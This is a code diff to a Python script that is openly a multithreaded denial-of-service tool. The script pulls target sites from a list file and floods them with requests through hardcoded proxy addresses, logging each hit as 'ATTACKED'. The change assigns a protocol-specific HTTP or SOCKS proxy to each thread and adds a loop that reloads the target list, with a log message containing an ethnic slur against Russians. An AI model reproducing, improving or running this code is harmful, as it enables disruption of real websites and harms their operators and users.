@@ -98,9 +98,7 @@ def get_proxy(data, checker):
 
 
 
-def mainth():
-    current_target = None
-
+def mainth(protocol, ip):
     # Fetching data with proxy and targets
     with open('list.txt') as f:
         sites = f.read().splitlines()
@@ -109,21 +107,19 @@ def mainth():
         scraper = base_scraper()
         logger.info("GET RESOURCES FOR ATTACK")
         # data = choice(sites)
+        if len(sites) <= 0:
+            logger.info("MOSKALI SOSUT! ATTACK WILL BE RESTARTED IN FEW MINUTES")
+            sleep(300)
+            with open('list.txt') as f:
+                sites = f.read().splitlines()
+
         index_ = randint(0, len(sites) - 1)
-        data = sites[index_]
+        current_target = sites[index_]
+        if not current_target.startswith(protocol):
+            sites.pop(index_)
+            continue
 
-        if current_target is None:
-            current_target = unquote(data)
-
-        if current_target.startswith('http') is False:
-            current_target = "https://" + current_target
-
-        proxies = [
-            'http://193.23.50.206:11335',
-            'http://193.23.50.164:10215'
-            # 'http://193.23.50.164:10216'
-        ]
-        cur_proxy = choice(proxies)
+        cur_proxy = ip
         scraper.proxies.update({'http': cur_proxy,
                                 'https': cur_proxy})
 
@@ -137,12 +133,12 @@ def mainth():
                 else:
                     response = scraper.get(current_target)
                 logger.info("ATTACKED; RESPONSE CODE: " +
-                            str(response.status_code) + " " + data)
+                            str(response.status_code) + " " + current_target)
                 if response.status_code == 404:
                     sites.pop(index_)
                     break
             except Exception as err:
-                logger.warning("GOT ISSUE WHILE ATTACKING " + data)
+                logger.warning("GOT ISSUE WHILE ATTACKING " + current_target)
                 sites.pop(index_)
                 break
 
@@ -154,7 +150,12 @@ def cleaner():
 
 
 if __name__ == '__main__':
+    proxies = [
+        ('http://', 'http://193.23.50.206:11335',),
+        ('https://', 'http://193.23.50.164:10215',),
+        ('https://', 'socks5://193.23.50.164:10216',)
+    ]
     for _ in range(threads):
-        Thread(target=mainth).start()
+        Thread(target=mainth, args=choice(proxies)).start()
 
     Thread(target=cleaner, daemon=True).start()
